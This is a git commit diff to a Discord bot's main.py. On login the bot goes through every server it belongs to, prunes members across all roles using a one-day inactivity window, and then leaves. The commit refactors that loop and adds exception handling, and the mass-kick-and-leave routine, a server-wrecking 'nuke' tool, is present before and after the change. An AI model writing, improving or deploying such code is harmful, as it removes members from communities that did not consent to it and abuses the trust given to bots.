22a1c5e0f5b9dbffabb82ce512d535d5802d95aa
console <108610560+idkconsole@users.noreply.github.com>
2024-01-30 21:33:32 +0530

    Update main.py

--- main.py
+++ main.py
@@ -1,21 +1,22 @@
 import discord
-from discord.ext import commands 
 
-token = ""
-intents = discord.Intents.all()
-client = commands.Bot(command_prefix="+",intents = intents)
+token = "bot token here"
+intents = discord.Intents.default()
+client = discord.Client(intents=intents)
 
 @client.event
 async def on_ready():
     print('Logged in as {0.user}'.format(client))
     for guild in client.guilds:
-      roles = []
-      days = 1
-      a = await guild.prune_members(days=days,roles=guild.roles,reason="Test")
-      print(f"Pruned {a} Members | {guild.name}")
-      await guild.leave()
-      print(f"Left {guild.name}")
-    else:
-      print("Left All Guild")
-      
+        try:
+            roles = guild.roles
+            days = 1
+            pruned_members_count = await guild.prune_members(days=days, roles=roles, reason="Test")
+            print(f"Pruned {pruned_members_count} Members | {guild.name}")
+            await guild.leave()
+            print(f"Left {guild.name}")
+        except discord.HTTPException as e:
+            print(e)
+    print("Left All Guilds")
+
 client.run(token)
